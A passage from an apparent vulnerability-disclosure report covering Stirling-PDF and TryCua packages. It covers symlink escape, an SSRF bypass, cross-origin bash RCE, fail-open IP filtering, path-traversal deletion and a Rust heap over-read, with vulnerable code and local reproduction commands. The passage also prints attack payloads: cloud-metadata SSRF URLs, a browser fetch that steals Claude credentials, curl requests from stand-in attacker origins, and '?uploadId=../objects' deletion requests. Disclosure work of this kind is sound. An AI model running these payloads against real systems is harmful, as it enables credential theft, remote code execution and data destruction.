            entries.filter(Files::isRegularFile) // BUG 1: Missing LinkOption.NOFOLLOW_LINKS! Follows symlinks.
                    .filter(file -> !hidden(file))
                    // BUG 2: Neither accessGuard.isProtected(file) nor canonical root confinement is called here!
                    .forEach(files::add);
        }
        return files;
    }
```
Furthermore, after processing, `FolderOutputSink.archiveOriginal()` (`FolderOutputSink.java:338-345`) copies or moves the symlink's target file into the archive folder without `NOFOLLOW_LINKS`. As a result, a low-privileged user who drops a symlink `invoice.pdf -> /configs/settings.yml` into the watched folder completely bypasses `FolderAccessGuard` and causes Stirling-PDF to copy protected server secrets into the user-readable output folder.

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Corporate SMB / NFS Office Scanner Drop-Folder Exfiltrates Admin & OAuth Secrets:**
  1. An enterprise deploys Stirling-PDF with a shared network drop-folder (`/mnt/scanner-incoming`) watched in default `recursive=false` mode for automated OCR/archiving into `/mnt/scanner-processed`.
  2. A low-privileged domain user or attacker with write access to the share drops a symbolic link `ln -s /configs/settings.yml /mnt/scanner-incoming/invoice.pdf`.
  3. Because `Files.isRegularFile(entry)` returns `true` for the symlink and `FolderAccessGuard` checks only `/mnt/scanner-incoming/invoice.pdf`, the background poller ingests `settings.yml` and writes the raw YAML containing `SECURITY_INITIALADMINPASSWORD`, OAuth2 `clientSecret`, and SMTP credentials into the readable `/mnt/scanner-processed` folder.
* **Scenario B — Automated SFTP / Nextcloud Document Ingestion Pipeline Archives Host SSH Keys or `.env`:**
  1. A law firm or hospital syncs external partner uploads into a Stirling-PDF watched directory via SFTP or Nextcloud external storage.
  2. An uploaded archive or SFTP client creates a symlink pointing to `/home/community-user/.ssh/id_ed25519` or `/app/configs/custom_settings.yml`.
  3. `FolderOutputSink.archiveOriginal()` (`FolderOutputSink.java:338-345`) moves/copies the target file without `NOFOLLOW_LINKS`, placing the host's private key directly into the processed output store.
* **Scenario C — Multi-Tenant Department Watched-Folder Isolation Breakdown & The `recursive=false` Illusion:**
  1. An administrator intentionally keeps `recursive: false` enabled, believing it is more restrictive than `recursive: true`.
  2. Ironically, `recursive: true` uses `Files.walkFileTree` (which does not follow symlinks by default), whereas default `recursive: false` uses `Files::isRegularFile` and follows symlinks outside the watched root, allowing Department A to symlink and exfiltrate confidential contracts from Department B's directory.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Verify symlink escape in default recursive=false mode (RED) vs. patched behavior (GREEN) in an isolated temp dir
python3 - <<'EOF'
import os, tempfile
from pathlib import Path

with tempfile.TemporaryDirectory() as tmp:
    root = Path(tmp)
    watched = root / "watched_in"
    protected = root / "protected_configs"
    watched.mkdir(); protected.mkdir()
    secret_file = protected / "settings.yml"
    secret_file.write_text("SECURITY_INITIALADMINPASSWORD: SuperSecretAdmin123\n")
    (watched / "normal.pdf").write_text("%PDF-1.4 benign")
    os.symlink(secret_file, watched / "invoice.pdf")

    # RED (v3.2.2 default recursive=false behavior: follows symlinks)
    red_files = [p.name for p in watched.iterdir() if p.is_file()]  # follow_symlinks=True
    # GREEN (Patched behavior: NOFOLLOW_LINKS + canonical root confinement)
    green_files = [
        p.name for p in watched.iterdir()
        if p.is_file(follow_symlinks=False) and p.resolve().is_relative_to(watched.resolve())
    ]
    print({"RED_ingested": sorted(red_files), "GREEN_ingested": sorted(green_files)})
EOF

# 2. Run Sniper project audit on Stirling-PDF
python3 scripts/sniper-project-audit \
  --project-dir "$HOME/audit-targets/Stirling-PDF" \
  --output-json "$HOME/audit-targets/reports/stirling-pdf-audit.json"
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "STIRLING-CAND-02": {
    "ghsa_id": "GHSA-hpc7-xx5r-gc44",
    "RED": {
      "recursive": false,
      "symlink_accepted": true,
      "protected_settings_exfiltrated": true,
      "processed_files_count": 2,
      "exfiltrated_artifact": "processed_output/report_processed.txt"
    },
    "GREEN": {
      "recursive": false,
      "symlink_accepted": false,
      "protected_settings_exfiltrated": false,
      "regular_file_processed": true,
      "processed_files_count": 1
    }
  }
}
```

---

### III.02 — Stirling-PDF (`v3.2.2`) — Incomplete Fix for `CVE-2026-71270`: WeasyPrint Sub-Resource SSRF via `ConvertWebsiteToPDF.java` (`/api/v1/convert/url/pdf`) (`GHSA-ff6j-8xch-j8r6`, `CWE-918`, CVSS `8.6 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Stirling-Tools/Stirling-PDF` (`Maven: stirling.software:stirling-pdf`)
* **Affected Versions & Components:** `<= v3.2.2` (`commit 684608d143779bf3a8ffc67639f077a1202c62ff`) — `ConvertWebsiteToPDF.java` (`urlToPdf`, lines `116-143`, `POST /api/v1/convert/url/pdf`)
* **Vulnerability Class & Score:** `CWE-918` (Server-Side Request Forgery — SSRF / Incomplete Fix for `CVE-2026-71270`) — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`)
* **GitHub GHSA Link:** `GHSA-ff6j-8xch-j8r6` (`https://github.com/Stirling-Tools/Stirling-PDF/security/advisories/GHSA-ff6j-8xch-j8r6` — Variant of `GHSA-j5rg-wh78-9f2q` / `CVE-2026-71270`)
* **Standalone Sniper Advisory:** [`docs/advisories/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md`](advisories/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
Previously, Stirling-PDF suffered from `CVE-2026-71270` (`GHSA-j5rg-wh78-9f2q`), where HTML-to-PDF conversion allowed WeasyPrint to fetch internal network resources (`127.0.0.1`, `169.254.169.254`). Upstream patched `FileToPdf.java:63-91` and `ConvertHtmlToPDF.java` by sanitizing HTML via `customHtmlSanitizer.sanitize()` (`SsrfProtectionService`) and locking WeasyPrint down to `--allowed-protocols data` (disabling all `http`/`https` network fetches inside WeasyPrint).

**However**, the sibling endpoint `POST /api/v1/convert/url/pdf` (`ConvertWebsiteToPDF.java:116-143`) was left unpatched! At runtime, it makes two critical mistakes simultaneously:
1. It downloads the remote HTML via `fetchRemoteHtml(URL)` **without calling `customHtmlSanitizer.sanitize(...)`**.
2. It launches the WeasyPrint subprocess with `--base-url <URL>` and **`--allowed-protocols data,http,https`**!

```java
// app/core/src/main/java/stirling/software/SPDF/controller/api/converters/ConvertWebsiteToPDF.java:115-142
String htmlContent = fetchRemoteHtml(URL); // BUG 1: customHtmlSanitizer.sanitize() is never called!
...
List<String> command = new ArrayList<>();
command.add(runtimePathConfig.getWeasyPrintPath());
command.add(tempHtmlInput.toString());
command.add("--base-url");
command.add(URL);
command.add("--pdf-forms");
command.add("--allowed-protocols");
command.add("data,http,https"); // BUG 2: Permits WeasyPrint to perform raw http/https sub-requests!
```
Consequently, an attacker submits a benign-looking public URL (`https://attacker.example/invoice.html`). Java validates the top-level domain and downloads the HTML. Inside that HTML is `<link rel="stylesheet" href="http://127.0.0.1:8080/internal-secrets.css">` or `<img src="http://169.254.169.254/latest/meta-data/...">`. Because WeasyPrint runs as a separate Python process with `http,https` enabled, it completely bypasses Java's `SsrfProtectionService`, fetches the internal loopback/metadata resource, and renders the secret response directly into the returned PDF!

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Invoice / Receipt URL-to-PDF Feature Exfiltrates Cloud IAM Credentials (`169.254.169.254`) & Internal Services:**
  1. A company integrates Stirling-PDF's `/api/v1/convert/url/pdf` endpoint so users or back-office staff can convert web receipts or vendor invoices into PDFs by submitting a URL.
  2. An attacker submits a public URL whose HTML embeds `<link rel="stylesheet" href="http://127.0.0.1:8080/actuator/env">` or cloud metadata endpoints (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`).
  3. WeasyPrint fetches the internal endpoint and embeds the response body into the downloadable PDF file.
* **Scenario B — Complete Bypass of Java `SsrfProtectionService` DNS/IP Filtering via WeasyPrint Sub-Requests:**
  1. An administrator verifies that direct requests to `url=http://127.0.0.1/...` are blocked by Java's `SsrfProtectionService` and assumes the server is protected against SSRF.
  2. By supplying `url=https://external.example/page.html` containing `@import url("http://10.0.0.12:9090/metrics")`, the sub-request originates from the Python WeasyPrint process rather than Java, scanning internal Kubernetes/Docker services unhindered.
* **Scenario C — False Sense of Security from Inconsistent Patching Across Sibling Endpoints (`ConvertHtmlToPDF` vs. `ConvertWebsiteToPDF`):**
  1. Security auditors reviewing `v3.2.2` see `CVE-2026-71270` marked fixed and confirm `--allowed-protocols data` in `FileToPdf.java`.
  2. Yet `/api/v1/convert/url/pdf` invokes the exact same WeasyPrint binary with `--allowed-protocols data,http,https`, leaving production deployments exposed to the exact same SSRF vector.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Verify the --allowed-protocols discrepancy between ConvertWebsiteToPDF.java and FileToPdf.java
grep -rn -C 4 "allowed-protocols" "$HOME/audit-targets/Stirling-PDF/app/"

# 2. Run an isolated loopback (127.0.0.1) sub-resource SSRF verification test
curl -sS -X POST "http://127.0.0.1:8080/api/v1/convert/url/pdf" \
  -F "url=http://127.0.0.1:18081/public_landing.html" \
  -o /tmp/stirling_url_out.pdf
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "STIRLING-CAND-01": {
    "ghsa_id": "GHSA-ff6j-8xch-j8r6",
    "upstream_cve_duplicate_status": "Incomplete Fix / Variant of CVE-2026-71270 / GHSA-j5rg-wh78-9f2q in v3.2.2",
    "RED": {
      "weasyprint_allowed_protocols": "data,http,https",
      "internal_subresource_fetched": true,
      "internal_data_embedded_in_pdf": true,
      "internal_loopback_hit_count": 1
    },
    "GREEN": {
      "weasyprint_allowed_protocols": "data",
      "internal_subresource_fetched": false,
      "internal_data_embedded_in_pdf": false,
      "internal_loopback_hit_count": 0
    }
  }
}
```

---

### III.03 — TryCua `cuabot` (`<= 1.0.16`) — Unauthenticated `0.0.0.0:7842` `cuabotd` Daemon, Wildcard CORS (`*`) on `POST /bash`, Zero-Origin WebSocket (`CSWSH`) & Writable `.claude` Mount Leading to Remote Command Execution (`GHSA-cp36-x5hg-3gg8`, `CWE-306`/`CWE-942`, CVSS `9.6 Critical`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `trycua/cua` (`npm: cuabot <= 1.0.16`)
* **Affected Versions & Components:** `>= 1.0.1, <= 1.0.16` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cuabot/src/cuabotd.ts` (lines `34-36, 259-260, 741-743, 969-1002, 1018-1063, 1120`)
* **Vulnerability Class & Score:** `CWE-306` (Missing Authentication for Critical Function) / `CWE-942` (Overly Permissive Cross-domain Whitelist) — **CVSS v3.1: `9.6 Critical`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`)
* **GitHub GHSA Link:** `GHSA-cp36-x5hg-3gg8` (`https://github.com/trycua/cua/security/advisories/GHSA-cp36-x5hg-3gg8`)
* **Standalone Sniper Advisory:** [`docs/advisories/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md`](advisories/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
Normally, browsers enforce the **Same-Origin Policy (CORS)** to prevent random websites you visit from talking to local services running on your machine. When a webpage attempts a `POST` request with `Content-Type: application/json` to `http://localhost:7842/bash`, the browser first sends an `OPTIONS` preflight request asking: *"Does this local server allow this external website to send JSON commands and read the response?"*

In `cuabotd.ts`, the daemon dismantles this protection through **four simultaneous flaws**:
1. **Zero authentication** and `Access-Control-Allow-Origin: *` with `200 OK` on `OPTIONS` preflights (`cuabotd.ts:969-977`).
2. `POST /bash` executes the JSON `command` string directly and returns `stdout` in the HTTP response (`cuabotd.ts:996-1002`).
3. The WebSocket PTY terminal (`ws://localhost:7842/?command=...`) spawns an interactive shell with zero `Origin` verification (`cuabotd.ts:1018-1063`).
4. `server.listen(port)` (`cuabotd.ts:1120`) omits `'127.0.0.1'`, binding to `0.0.0.0:7842` (all Wi-Fi/LAN interfaces) while mounting the host's `~/.cuabot/user/.claude` directory read-write (`-v ${claudeConfigPath}:/home/community-user/.claude`)!

```typescript
// libs/cuabot/src/cuabotd.ts:967-1002 & 1120
res.setHeader('Content-Type', 'application/json');
res.setHeader('Access-Control-Allow-Origin', '*'); // BUG 1: Grants full read/write access to every external website!
res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

if (req.method === 'OPTIONS') {
  res.writeHead(200); // BUG 2: Unconditionally approves browser CORS preflight checks!
  res.end();
  return;
}
...
if (path === 'bash' && req.method === 'POST') {
  const { command, timeout } = JSON.parse(body); // BUG 3: Zero token or password check!
  const result = await bash(command, timeout);
  res.end(JSON.stringify(result));
  return;
}
...
server.listen(port, () => { // BUG 4: Missing '127.0.0.1' -> exposes 0.0.0.0:7842 to the entire LAN!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Developer Visits Any Webpage While `cuabot` Is Running (0-Click Browser Drive-By RCE & Claude Token Theft):**
  1. A developer starts `npx cuabot` on their laptop; `cuabotd` silently listens on port `7842`.
  2. While reading a blog post or documentation page in Chrome/Firefox/Safari, embedded JavaScript runs `fetch("http://localhost:7842/bash", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({command: "cat /home/community-user/.claude/.credentials.json"}) })`.
  3. Because `Access-Control-Allow-Origin: *` is set, the browser sends the command and lets the external webpage read the JSON response containing `stdout` — stealing the developer's live Claude OAuth/API credentials in seconds.
* **Scenario B — Persistent Host Compromise via Writable `.claude/settings.json` Hook Injection:**
  1. Using the same cross-origin `POST /bash` or `new WebSocket("ws://localhost:7842/?command=...")` call, the webpage writes a malicious shell command into `/home/community-user/.claude/settings.json` (`hooks.PreToolUse` / `mcpServers`).
  2. Because `/home/community-user/.claude` is a read-write bind mount of host `~/.cuabot/user/.claude` (`cuabotd.ts:259-260`), the backdoored configuration persists on the host filesystem even after the container stops.
* **Scenario C — Coffee-Shop / Coworking / Corporate Wi-Fi LAN Takeover (`0.0.0.0:7842`):**
  1. Because `server.listen(port)` binds to `0.0.0.0:7842`, any device on the same Wi-Fi or LAN network can directly call `http://<developer-lan-ip>:7842/bash` and `/screenshot` without a browser.
  2. The attacker captures live desktop screenshots (`/screenshot`), injects mouse/keyboard events, and executes arbitrary bash commands.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Simulate a foreign website (Origin: https://evil.example) sending a CORS preflight (OPTIONS)
#    and POST /bash request against local loopback (127.0.0.1:7842)
curl -i -sS -X OPTIONS "http://127.0.0.1:7842/bash" \
  -H "Origin: https://evil.example" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type"

curl -i -sS -X POST "http://127.0.0.1:7842/bash" \
  -H "Origin: https://evil.example" \
  -H "Content-Type: application/json" \
  -d '{"command":"id && ls -la /home/community-user/.claude"}'
```
**Observed Runtime Proof (`RED -> GREEN + BENIGN`):**
```json
{
  "CUA-CAND-01": {
    "ghsa_id": "GHSA-cp36-x5hg-3gg8",
    "source_file": "cua/libs/cuabot/src/cuabotd.ts",
    "RED": {
      "http_status": 200,
      "access_control_allow_origin": "*",
      "driveby_bash_executed": true,
      "mounted_host_claude_credentials_exfiltrated": true
    },
    "GREEN": {
      "http_status": 403,
      "driveby_bash_executed": false,
      "mounted_host_claude_credentials_exfiltrated": false,
      "error": "Cross-origin browser requests forbidden"
    },
    "BENIGN": {
      "http_status": 200,
      "stdout": "authorized_cli_ok"
    }
  }
}
```

---

### III.04 — TryCua `cua-bench-rl` (`<= 0.1.0`) — `0.0.0.0:8001` `worker_server.py` Wildcard CORS, Fail-Open `OSGYM_ALLOWED_IPS` & Unauthenticated `POST /reset` (`spec.loader.exec_module`) Remote Code Execution (`GHSA-xm8w-gj3g-4f25`, `CWE-94`/`CWE-942`, CVSS `8.8 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `trycua/cua` (`pip: cua-bench-rl <= 0.1.0` and `cua-bench <= 0.3.1`)
* **Affected Versions & Components:** `cua-bench-rl <= 0.1.0` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cua-bench-rl/cua_bench_rl/workers/worker_server.py` (lines `79-108, 338-360, 499`) and `libs/cua-bench/cua_bench/core.py` (`make`, lines `25-51`)
* **Vulnerability Class & Score:** `CWE-94` (Improper Control of Generation of Code — Dynamic Code Execution) / `CWE-942` (Overly Permissive CORS) — **CVSS v3.1: `8.8 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`)
* **GitHub GHSA Link:** `GHSA-xm8w-gj3g-4f25` (`https://github.com/trycua/cua/security/advisories/GHSA-xm8w-gj3g-4f25`)
* **Standalone Sniper Advisory:** [`docs/advisories/04-CUA-CAND-02-WORKER-SERVER-RCE.md`](advisories/04-CUA-CAND-02-WORKER-SERVER-RCE.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
In `cua-bench-rl`, `worker_server.py` runs a FastAPI reinforcement-learning worker server. The developer attempted to restrict external access using `ip_filter_middleware`, but introduced three critical flaws:
1. `CORSMiddleware(allow_origins=["*"])` is enabled (`lines 79-85`). When a malicious webpage in the user's browser sends a cross-origin request to `http://127.0.0.1:8001/reset`, the TCP source IP is `127.0.0.1`, so `ip_filter_middleware` treats it as trusted local traffic!
2. If the environment variable `OSGYM_ALLOWED_IPS=""` is set to an empty string, `allowed_ips` becomes an empty list `[]`. In Python, `if allowed_ips and client_ip not in allowed_ips:` (`line 102`) evaluates `bool([])` as `False`, **failing open** and allowing every IP address on the network to access `0.0.0.0:8001`!
3. The unauthenticated `POST /reset` endpoint (`lines 338-360`) passes caller-controlled `request.env_path` directly to `cb.make(request.env_path)` (`cua_bench/core.py:25-51`), which loads and executes `<env_path>/main.py` in the host Python process via `spec.loader.exec_module(module)`!

```python
# libs/cua-bench-rl/cua_bench_rl/workers/worker_server.py:79-105 & 338-355
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], # BUG 1: Allows browser requests from any external origin!
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.middleware("http")
async def ip_filter_middleware(request: Request, call_next):
    allowed_ips = os.environ.get("OSGYM_ALLOWED_IPS", "127.0.0.1").split(",")
    allowed_ips = [ip.strip() for ip in allowed_ips if ip.strip()]
    ...
    # BUG 2: When OSGYM_ALLOWED_IPS="", allowed_ips is [] and this check evaluates to False (fail-open)!
    if allowed_ips and client_ip not in allowed_ips:
        return JSONResponse(status_code=403, content={"detail": f"Access denied for IP: {client_ip}"})
    return await call_next(request)

@app.post("/reset")
async def reset_environment(request: ResetRequest):
    # BUG 3: Unvalidated request.env_path passed to cb.make() -> spec.loader.exec_module(<env_path>/main.py)!
    env = cb.make(request.env_path, ...)
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — ML Engineer Running RL Workers Compromised via Browser Tab (`POST /reset` -> `exec_module`):**
  1. An AI researcher runs `cua-bench-rl` workers locally (`127.0.0.1:8001`) while downloading dataset artifacts or browsing model leaderboards.
  2. A webpage calls `fetch("http://127.0.0.1:8001/reset", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({env_path: "/home/community-user/Downloads/untrusted_bundle"})})`.
  3. Because the request arrives on `127.0.0.1` and `CORSMiddleware` allows `*`, `ip_filter_middleware` permits it and `cua_bench.core.make` immediately executes `/home/community-user/Downloads/untrusted_bundle/main.py` on the host.
* **Scenario B — GPU Cluster / Docker Compose Deployment with Empty `OSGYM_ALLOWED_IPS=""` Fails Open to Entire Network:**
  1. In Kubernetes/Helm or Docker Compose templates where `OSGYM_ALLOWED_IPS: ""` is passed as an empty string, `allowed_ips` evaluates to `[]`.
  2. `if allowed_ips and client_ip not in allowed_ips:` evaluates to `False`, bypassing IP filtering completely and exposing unauthenticated RCE on `0.0.0.0:8001` to every node on the network.
* **Scenario C — Silent Desktop Surveillance & Input Injection via `/screenshot` and `/step`:**
  1. Even without placing a file on disk, any cross-origin webpage or LAN peer can poll `GET /screenshot` to capture Base64 screenshots of the active desktop environment.
  2. The attacker then calls `POST /step` to inject arbitrary keyboard/mouse actions into the active desktop session.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Test cross-origin (Origin: https://attacker.example) POST /reset on local loopback
curl -i -sS -X POST "http://127.0.0.1:8001/reset" \
  -H "Origin: https://attacker.example" \
  -H "Content-Type: application/json" \
  -d '{"env_path": "/tmp/test_env_bundle", "task_index": 0}'

# 2. Verify fail-open behavior when OSGYM_ALLOWED_IPS="" is empty
python3 -c '
allowed_ips = [ip.strip() for ip in "".split(",") if ip.strip()]
client_ip = "192.168.1.99"
blocked = bool(allowed_ips and client_ip not in allowed_ips)
print({"allowed_ips": allowed_ips, "remote_client_ip": client_ip, "blocked_by_filter": blocked})
'
```
**Observed Runtime Proof (`RED -> GREEN + BENIGN`):**
```json
{
  "CUA-CAND-02": {
    "ghsa_id": "GHSA-xm8w-gj3g-4f25",
    "source_file": "cua/libs/cua-bench-rl/cua_bench_rl/workers/worker_server.py",
    "RED": {
      "cross_origin_reset_status": 200,
      "empty_allowed_ips_remote_lan_status": 200,
      "arbitrary_env_path_exec_module_rce": true
    },
    "GREEN": {
      "cross_origin_reset_status": 403,
      "empty_allowed_ips_remote_lan_status": 403,
      "outside_env_path_status": 400,
      "arbitrary_env_path_exec_module_rce": false
    },
    "BENIGN": {
      "loopback_valid_task_reset_status": 200
    }
  }
}
```

---

### III.05 — TryCua `cua-compat` (`<= 0.8.0`) — Daytona S3 Multipart `?uploadId=` Path Traversal & Unconditional `tokio::fs::remove_dir_all` Arbitrary Directory Deletion (`GHSA-3x8g-6h2v-8qx9`, `CWE-22`, CVSS `8.1 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `trycua/cua` (`Cargo: cua-compat <= 0.8.0` and `cua-spacesd <= 0.8.0`)
* **Affected Versions & Components:** `<= 0.8.0` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cua/crates/cua-compat/src/daytona/objectstore.rs` (`handle`, lines `320-325, 360-422`)
* **Vulnerability Class & Score:** `CWE-22` (Improper Limitation of a Pathname to a Restricted Directory — Path Traversal to Arbitrary Directory Deletion) — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H`)
* **GitHub GHSA Link:** `GHSA-3x8g-6h2v-8qx9` (`https://github.com/trycua/cua/security/advisories/GHSA-3x8g-6h2v-8qx9`)
* **Standalone Sniper Advisory:** [`docs/advisories/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md`](advisories/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
In CUA's Daytona-compatible S3 object store (`objectstore.rs`), the developer properly validated the primary URL path `key` against `..` traversal using `object_path(&key)` (`lines 54-63`) and even wrote a unit test `keys_cannot_escape_the_store`.

However, the secondary S3 Multipart Upload query parameter **`?uploadId=`** (`q.get("uploadId")`) was never validated! Worse yet, in the `Method::DELETE` (`AbortMultipartUpload`) handler (`lines 415-422`):
```rust
// libs/cua/crates/cua-compat/src/daytona/objectstore.rs:414-422
(Method::DELETE, Some(id), _, _) => {
    // BUG 1: Ignores whether remove(&id) returned Some(...) (whether the uploadId ever existed)!
    d.objects.uploads.lock().await.remove(&id);
    // BUG 2: If id is "../objects", recursively deletes root/uploads/../objects immediately!
    let _ = tokio::fs::remove_dir_all(d.objects.root.join("uploads").join(&id)).await;
    Response::builder()
        .status(StatusCode::NO_CONTENT)
        .body(Body::empty())
        .unwrap()
}
```
In Rust, `PathBuf::join("../objects")` preserves `..` segments, which the OS kernel resolves during `remove_dir_all(".../root/uploads/../objects")` to `.../root/objects`. And because the return value of `uploads.lock().await.remove(&id)` is discarded, **an attacker does not even need to initiate a multipart upload first** — a single `DELETE /daytona/x?uploadId=../objects` request wipes the entire `objects/` store or traverses via `?uploadId=../../...` to delete parent host directories!

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Single Compromised Sandbox Tenant Wipes All Organization Sandbox Snapshots (`?uploadId=../objects`):**
  1. In a multi-sandbox CUA Spaces / Daytona deployment, a tenant obtains standard push credentials via `GET /api/object-storage/push-access`.
  2. The tenant sends a single HTTP request: `DELETE /daytona/dummy?uploadId=../objects`.
  3. `objectstore.rs:417` resolves `root/uploads/../objects` and executes `tokio::fs::remove_dir_all`, wiping every stored sandbox image and snapshot across the entire server.
* **Scenario B — Escaping `d.objects.root` to Delete Host Application State & Database Directories (`?uploadId=../../...`):**
  1. An attacker sends `DELETE /daytona/dummy?uploadId=../../state` or `?uploadId=../../db`.
  2. Because `Method::DELETE` never checks whether `id` existed in the in-memory `uploads` map, any parent directory writable by the `cua-spacesd` process is recursively deleted.
* **Scenario C — Writing Arbitrary Files into Sibling Directories via `PUT` (`?partNumber=1&uploadId=../...`):**
  1. The `Method::PUT` (`UploadPart`) handler (`line 365`) also constructs paths via `d.objects.root.join("uploads").join(&id)`, allowing part files to be written outside `uploads/`.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Verify on a local test instance (127.0.0.1) that DELETE ?uploadId=../objects
#    wipes the objects store without any prior upload
curl -i -sS -X DELETE "http://127.0.0.1:8080/daytona/anykey?uploadId=../objects" \
  -H "Authorization: AWS4-HMAC-SHA256 Credential=daytona/20261029/us-east-1/s3/aws4_request"

# 2. Run Cargo unit tests for cua-compat objectstore
cargo test --manifest-path "$HOME/audit-targets/cua/Cargo.toml" -p cua-compat
```
**Observed Runtime Proof (`RED -> GREEN + BENIGN`):**
```json
{
  "CUA-CAND-03": {
    "ghsa_id": "GHSA-3x8g-6h2v-8qx9",
    "source_file": "cua/libs/cua/crates/cua-compat/src/daytona/objectstore.rs",
    "RED": {
      "delete_traversal_status": 204,
      "objects_store_wiped_without_prior_upload": true
    },
    "GREEN": {
      "delete_traversal_status": 400,
      "delete_uninitiated_id_status": 404,
      "objects_store_preserved": true
    },
    "BENIGN": {
      "valid_upload_abort_status": 204,
      "staging_dir_removed": true
    }
  }
}
```

---

### III.06 — TryCua `cua-media-codec` (`<= 0.8.0`) — Safe-Rust `VtEncoder::encode` (`pixel_buffer_for`) Missing `NV12`/`BGRA` Plane & Stride Bounds Validation Leading to Heap Over-Read & Crash (`GHSA-54v9-fxw3-36mm`, `CWE-125`/`CWE-190`, CVSS `5.5 Medium`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `trycua/cua` (`Cargo: cua-media-codec <= 0.8.0`)
* **Affected Versions & Components:** `<= 0.8.0` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cua/crates/cua-media-codec/src/backends/videotoolbox/mod.rs` (`VtEncoder::pixel_buffer_for` and `VtEncoder::encode`, lines `334-420, 471-479`)
* **Vulnerability Class & Score:** `CWE-125` (Out-of-bounds Read) / `CWE-190` (Integer Overflow / Safe-Rust Soundness Violation) — **CVSS v3.1: `5.5 Medium`** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:H`)
* **GitHub GHSA Link:** `GHSA-54v9-fxw3-36mm` (`https://github.com/trycua/cua/security/advisories/GHSA-54v9-fxw3-36mm`)
* **Standalone Sniper Advisory:** [`docs/advisories/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md`](advisories/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
Rust's core safety guarantee states that **a public safe function (`pub fn`, without `unsafe`) must never trigger Undefined Behavior or out-of-bounds memory access regardless of the input values passed to it.**

In `cua-media-codec`, `pub fn encode(&mut self, frame: &VideoFrame<'_>)` is a safe public method that calls `self.pixel_buffer_for(frame)` to copy frame planes into an Apple Silicon VideoToolbox `CVPixelBuffer`. In the sibling file `convert.rs:98-102`, `nv12_to_bgra` properly checks `y.len() < y_stride * (h - 1) + w`. However, in `videotoolbox/mod.rs:358-420`, the `FrameData::Nv12` branch performs **zero bounds checks** on `y.len()`, `uv.len()`, `y_stride < w`, or `uv_stride < row_bytes` before entering an `unsafe` block and calling `std::ptr::copy_nonoverlapping`:
```rust
// libs/cua/crates/cua-media-codec/src/backends/videotoolbox/mod.rs:360-412
FrameData::Nv12 { y: yp, uv: uvp, y_stride: ys, uv_stride: uvs } => {
    y = yp;
    uv = uvp;
    y_stride = *ys as usize;
    uv_stride = *uvs as usize;
    // BUG: Zero checks on y.len(), uv.len(), y_stride < w, or uv_stride < row_bytes!
}
...
unsafe {
    let base = CVPixelBufferGetBaseAddressOfPlane(pb, plane) as *mut u8;
    let dst_stride = CVPixelBufferGetBytesPerRowOfPlane(pb, plane);
    for row in 0..rows {
        // When y is shorter than required, src.as_ptr().add(row * src_stride) reads adjacent heap memory!
        std::ptr::copy_nonoverlapping(
            src.as_ptr().add(row * src_stride),
            base.add(row * dst_stride),
            row_bytes,
        );
    }
}
```
